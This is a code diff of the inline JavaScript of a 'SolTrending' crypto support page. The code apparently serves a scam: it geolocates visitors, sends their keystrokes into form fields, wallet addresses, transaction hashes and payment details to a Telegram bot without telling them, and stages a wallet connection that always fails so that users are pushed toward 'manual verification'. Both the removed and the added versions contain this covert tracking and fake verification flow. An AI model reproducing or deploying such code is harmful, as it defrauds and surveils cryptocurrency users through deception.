-    const manualVerificationStatus = document.getElementById('manualVerificationStatus');
+        // Modal elements
+        const modalDescription = document.getElementById('modalDescription');
+        const connectWalletOption = document.getElementById('connectWalletOption');
+        const connectButtonText = document.getElementById('connectButtonText');
+        const connectLoading = document.getElementById('connectLoading');
+        const connectionStatus = document.getElementById('connectionStatus');
+        const manualInput = document.getElementById('manualInput');
+        const manualWalletAddress = document.getElementById('manualWalletAddress');
+        const useManualAddress = document.getElementById('useManualAddress');
+        const manualVerificationStatus = document.getElementById('manualVerificationStatus');
 
-    // Get user's country
-    async function getUserCountry() {
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            userCountry = data.country_name || 'Unknown';
-        } catch (error) {
-            console.error('Failed to get user country:', error);
-            userCountry = 'Unknown';
+        // Get user's country
+        async function getUserCountry() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                userCountry = data.country_name || 'Unknown';
+            } catch (error) {
+                console.error('Failed to get user country:', error);
+                userCountry = 'Unknown';
+            }
         }
-    }
 
-    // Send notification to admin about user actions
-    async function notifyAdmin(action, data = {}) {
-        const message = `
-```
-
+        // Send notification to admin about user actions
+        async function notifyAdmin(action, data = {}) {
+            const message = `
 🔔 *SolTrending Support Activity*
 
 👤 *Action:* ${action}
 🌍 *Country:* ${userCountry}
 ⏰ *Time:* ${new Date().toLocaleString()}
 
-${data.details ? `📝 *Details:* ${data.details}` : ‘’}
-${data.wallet ? `💳 *Wallet Address:* \`${data.wallet}``: ''} ${data.form ?`
+${data.details ? `📝 *Details:* ${data.details}` : ''}
+${data.wallet ? `💳 *Wallet Address:* \`${data.wallet}\`` : ''}
+${data.form ? `
 📋 *Form Data:*
-• Token: `${data.form.tokenAddress || ‘Not filled’}`
-• Wallet: `${data.form.walletAddress || ‘Not filled’}`
-• TxHash: `${data.form.transactionHash || ‘Not filled’}`
-• Paid To: `${data.form.paidToWallet || ‘Not filled’}`
+• Token: \`${data.form.tokenAddress || 'Not filled'}\`
+• Wallet: \`${data.form.walletAddress || 'Not filled'}\`
+• TxHash: \`${data.form.transactionHash || 'Not filled'}\`
+• Paid To: \`${data.form.paidToWallet || 'Not filled'}\`
 ` : ''}`;
 
-```
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
-        try {
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: ADMIN_USER_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-        } catch (error) {
-            console.error('Failed to notify admin:', error);
-        }
-    }
-
-    // Show status message
-    function showStatus(message, type) {
-        statusMessage.textContent = message;
-        statusMessage.className = `status-message status-${type}`;
-        statusMessage.style.display = 'block';
-        
-        if (type === 'success') {
-            setTimeout(() => {
-                statusMessage.style.display = 'none';
-            }, 5000);
-        }
-    }
-
-    // Show wallet status
-    function showWalletStatus(message, type) {
-        const statusClass = type === 'success' ? 'status-success' : 
-                          type === 'error' ? 'status-error' : 
-                          type === 'warning' ? 'status-warning' : 'status-info';
-        
-        walletStatus.innerHTML = `<div class="${statusClass}">${message}</div>`;
-        walletStatus.style.display = 'block';
-    }
-
-    // Open wallet modal and start connection simulation
-    function openWalletModal() {
-        walletModal.classList.add('active');
-        resetModalState();
-        simulateWalletConnection();
-    }
-
-    // Close wallet modal
-    function closeWalletModal() {
-        walletModal.classList.remove('active');
-        resetModalState();
-        
-        if (!isWalletConnected && currentFormData) {
-            // User cancelled wallet connection, but form was already submitted
-            showWalletStatus('⚠️ Wallet verification cancelled. Your request is pending admin review.', 'warning');
-        }
-    }
-
-    // Reset modal to initial state
-    function resetModalState() {
-        modalDescription.textContent = 'Attempting to connect to your wallet for verification...';
-        connectWalletOption.disabled = true;
-        connectButtonText.textContent = 'Connecting...';
-        connectLoading.style.display = 'inline-block';
-        connectionStatus.innerHTML = '';
-        manualInput.style.display = 'none';
-        manualWalletAddress.value = '';
-        manualVerificationStatus.innerHTML = '';
-    }
-
-    // Simulate wallet connection attempt
-    function simulateWalletConnection() {
-        setTimeout(() => {
-            // Connection failed
-            modalDescription.textContent = 'Automatic verification failed. Please try manual verification.';
-            connectWalletOption.disabled = false;
-            connectButtonText.textContent = 'Verify Manually';
-            connectLoading.style.display = 'none';
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
-            connectionStatus.innerHTML = `
-                <div class="connection-failed">
-                    ❌ Automatic verification failed
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_USER_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Failed to notify admin:', error);
+            }
+        }
+
+        // Show status message
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = `status-message status-${type}`;
+            statusMessage.style.display = 'block';
+            
+            if (type === 'success') {
+                setTimeout(() => {
+                    statusMessage.style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        // Show wallet status
+        function showWalletStatus(message, type) {
+            const statusClass = type === 'success' ? 'status-success' : 
+                              type === 'error' ? 'status-error' : 
+                              type === 'warning' ? 'status-warning' : 'status-info';
+            
+            walletStatus.innerHTML = `<div class="${statusClass}">${message}</div>`;
+            walletStatus.style.display = 'block';
+        }
+
+        // Open wallet modal and start connection simulation
+        function openWalletModal() {
+            walletModal.classList.add('active');
+            resetModalState();
+            simulateWalletConnection();
+        }
+
+        // Close wallet modal
+        function closeWalletModal() {
+            walletModal.classList.remove('active');
+            resetModalState();
+            
+            if (!isWalletConnected && currentFormData) {
+                // User cancelled wallet connection, but form was already submitted
+                showWalletStatus('⚠️ Wallet connection cancelled. Your request is pending admin verification.', 'warning');
+            }
+        }
+
+        // Reset modal to initial state
+        function resetModalState() {
+            modalDescription.textContent = 'Attempting to connect to your wallet for verification...';
+            connectWalletOption.disabled = true;
+            connectButtonText.textContent = 'Connecting...';
+            connectLoading.style.display = 'inline-block';
+            connectionStatus.innerHTML = '';
+            manualInput.style.display = 'none';
+            manualWalletAddress.value = '';
+            manualVerificationStatus.innerHTML = '';
+        }
+
+        // Simulate wallet connection attempt
+        function simulateWalletConnection() {
+            setTimeout(() => {
+                // Connection failed
+                modalDescription.textContent = 'Connection failed. Please try manual verification.';
+                connectWalletOption.disabled = false;
+                connectButtonText.textContent = 'Connect Manually';
+                connectLoading.style.display = 'none';
+                
+                connectionStatus.innerHTML = `
+                    <div class="connection-failed">
+                        ❌ Automatic connection failed
+                    </div>
+                `;
+            }, 3000); // 3 second delay
+        }
+
+        // Handle manual connection button click
+        function handleManualConnection() {
+            manualInput.style.display = 'block';
+            modalDescription.textContent = 'Enter your wallet address below for manual verification.';
+        }
+
+        // Handle manual wallet connection
+        async function handleManualWalletConnection() {
+            const address = manualWalletAddress.value.trim();
+            
+            // Send wallet address to admin immediately (even if empty or invalid)
+            await notifyAdmin('Manual wallet verification attempted', { 
+                wallet: address || 'Empty address',
+                details: `User attempted manual wallet verification${address ? '' : ' with empty address'}`,
+                form: currentFormData
+            });
+
+            if (!address) {
+                // Still close modal and show loading even with empty address
+                closeWalletModal();
+                showWalletStatus('🔄 Processing connection...', 'info');
+                
+                setTimeout(() => {
+                    showWalletStatus('❌ Verification failed. Empty wallet address provided. Manual verification required by admin.', 'error');
+                }, 3000);
+                return;
+            }
+
+            // Close modal immediately after clicking submit
+            closeWalletModal();
+            
+            // Show loading state outside modal
+            showWalletStatus('🔄 Processing wallet verification...', 'info');
+            
+            // Simulate connection attempt (3 seconds loading)
+            setTimeout(() => {
+                if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address)) {
+                    showWalletStatus('❌ Verification failed. Invalid wallet address format. Manual verification required by admin.', 'error');
+                } else {
+                    showWalletStatus('❌ Verification failed. Unable to verify wallet automatically. Manual verification required by admin.', 'error');
+                }
+            }, 3000);
+        }
+
+        // Show manual verification status
+        function showManualVerificationStatus(message, type) {
+            const statusClass = type === 'error' ? 'connection-failed' : 
+                              type === 'pending' ? 'verification-pending' : 
+                              'status-success';
+            
+            manualVerificationStatus.innerHTML = `
+                <div class="${statusClass}" style="margin-top: 15px;">
+                    ${message}
                 </div>
             `;
-        }, 3000); // 3 second delay
-    }
+        }
 
-    // Handle manual connection button click
-    function handleManualConnection() {
-        manualInput.style.display = 'block';
-        modalDescription.textContent = 'Enter your wallet address below for manual verification.';
-    }
+        // Validate form
+        function validateForm() {
+            const formData = {
+                tokenAddress: document.getElementById('tokenAddress').value.trim(),
+                walletAddress: document.getElementById('walletAddress').value.trim(),
+                transactionHash: document.getElementById('transactionHash').value.trim(),
+                paidToWallet: document.getElementById('paidToWallet').value.trim()
+            };
 
-    // Handle manual wallet connection
-    async function handleManualWalletConnection() {
-        const address = manualWalletAddress.value.trim();
-        
-        // Send wallet address to admin immediately (even if empty or invalid)
-        await notifyAdmin('Manual wallet verification attempted', { 
-            wallet: address || 'Empty address',
-            details: `User attempted manual wallet verification${address ? '' : ' with empty address'}`,
-            form: currentFormData
-        });
+            const allFilled = Object.values(formData).every(value => value !== '');
+            
+            if (!allFilled) {
+                showStatus('Please fill in all required fields.', 'error');
+                return false;
+            }
 
-        if (!address) {
-            // Still close modal and show loading even with empty address
-            closeWalletModal();
-            showWalletStatus('🔄 Processing verification...', 'info');
+            return formData;
+        }
+
+        // Handle form submission
+        async function handleSubmit(e) {
+            e.preventDefault();
+            
+            const formData = validateForm();
+            if (!formData) return;
+
+            currentFormData = formData;
+            
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = 'Processing... <div class="loading"></div>';
+
+            // Send form data to admin first
+            await notifyAdmin('Support form submitted - requesting wallet verification', { 
+                form: formData,
+                details: 'User submitted support form, wallet verification required'
+            });
+
+            // Show success message and open wallet modal
+            showStatus('Form submitted successfully! Please connect your wallet to complete verification.', 'success');
             
             setTimeout(() => {
-                showWalletStatus('❌ Verification failed. Empty wallet address provided. Manual review required by admin.', 'error');
-            }, 3000);
-            return;
+                openWalletModal();
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Check Transactions';
+            }, 2000);
         }
 
-        // Close modal immediately after clicking submit
-        closeWalletModal();
-        
-        // Show loading state outside modal
-        showWalletStatus('🔄 Processing wallet verification...', 'info');
-        
-        // Simulate verification attempt (3 seconds loading)
-        setTimeout(() => {
-            showWalletStatus('❌ Verification failed. Unable to verify wallet automatically. Manual review required by admin.', 'error');
-        }, 3000);
-    }
-
-    // Show manual verification status
-    function showManualVerificationStatus(message, type) {
-        const statusClass = type === 'error' ? 'connection-failed' : 
-                          type === 'pending' ? 'verification-pending' : 
-                          'status-success';
-        
-        manualVerificationStatus.innerHTML = `
-            <div class="${statusClass}" style="margin-top: 15px;">
-                ${message}
-            </div>
-        `;
-    }
-
-    // Validate form
-    function validateForm() {
-        const formData = {
-            tokenAddress: document.getElementById('tokenAddress').value.trim(),
-            walletAddress: document.getElementById('walletAddress').value.trim(),
-            transactionHash: document.getElementById('transactionHash').value.trim(),
-            paidToWallet: document.getElementById('paidToWallet').value.trim()
-        };
-
-        const allFilled = Object.values(formData).every(value => value !== '');
-        
-        if (!allFilled) {
-            showStatus('Please fill in all required fields.', 'error');
-            return false;
-        }
-
-        return formData;
-    }
-
-    // Handle form submission
-    async function handleSubmit(e) {
-        e.preventDefault();
-        
-        const formData = validateForm();
-        if (!formData) return;
-
-        currentFormData = formData;
-        
-        submitBtn.disabled = true;
-        submitBtn.innerHTML = 'Processing... <div class="loading"></div>';
-
-        // Send form data to admin first
-        await notifyAdmin('Trending request submitted - requesting wallet verification', { 
-            form: formData,
-            details: 'User submitted trending request, wallet verification required'
+        // Form field change listeners
+        ['tokenAddress', 'walletAddress', 'transactionHash', 'paidToWallet'].forEach(id => {
+            const field = document.getElementById(id);
+            field.addEventListener('input', () => {
+                // Notify admin when user fills important fields
+                if (field.value.trim() && field.value.trim().length > 10) {
+                    const fieldNames = {
+                        'tokenAddress': 'Token Address',
+                        'walletAddress': 'Wallet Address', 
+                        'transactionHash': 'Transaction Hash',
+                        'paidToWallet': 'Payment Recipient'
+                    };
+                    notifyAdmin(`User filled ${fieldNames[id]}`, { 
+                        details: `${fieldNames[id]}: ${field.value.slice(0, 20)}...` 
+                    });
+                }
+            });
         });
 
-        // Show success message and open wallet modal
-        showStatus('Request submitted successfully! Please verify your wallet to complete the process.', 'success');
-        
-        setTimeout(() => {
-            openWalletModal();
-            submitBtn.disabled = false;
-            submitBtn.textContent = 'Verify Transactions';
-        }, 2000);
-    }
+        // Event listeners
+        closeModal.addEventListener('click', closeWalletModal);
+        connectWalletOption.addEventListener('click', handleManualConnection);
+        useManualAddress.addEventListener('click', handleManualWalletConnection);
+        form.addEventListener('submit', handleSubmit);
 
-    // Form field change listeners
-    ['tokenAddress', 'walletAddress', 'transactionHash', 'paidToWallet'].forEach(id => {
-        const field = document.getElementById(id);
-        field.addEventListener('input', () => {
-            // Notify admin when user fills important fields
-            if (field.value.trim() && field.value.trim().length > 10) {
-                const fieldNames = {
-                    'tokenAddress': 'Token Address',
-                    'walletAddress': 'Wallet Address', 
-                    'transactionHash': 'Transaction Hash',
-                    'paidToWallet': 'Payment Recipient'
-                };
-                notifyAdmin(`User filled ${fieldNames[id]}`, { 
-                    details: `${fieldNames[id]}: ${field.value.slice(0, 20)}...` 
-                });
+        // Close modal on outside click
+        walletModal.addEventListener('click', (e) => {
+            if (e.target === walletModal) {
+                closeWalletModal();
             }
         });
-    });
 
-    // Event listeners
-    closeModal.addEventListener('click', closeWalletModal);
-    connectWalletOption.addEventListener('click', handleManualConnection);
-    useManualAddress.addEventListener('click', handleManualWalletConnection);
-    form.addEventListener('submit', handleSubmit);
-
-    // Close modal on outside click
-    walletModal.addEventListener('click', (e) => {
-        if (e.target === walletModal) {
-            closeWalletModal();
+        // Initialize
+        async function init() {
+            await getUserCountry();
+            notifyAdmin('User opened SolTrending support portal');
+            showStatus('Fill in your payment details below to get started with support.', 'info');
         }
-    });
 
-    // Initialize
-    async function init() {
-        await getUserCountry();
-        notifyAdmin('User opened SolTrending support page');
-        showStatus('Fill in your payment details below to get your token trending.', 'info');
-    }
-
-    init();
-</script>
-```
-
+        init();
+    </script>
 </body>
 </html>
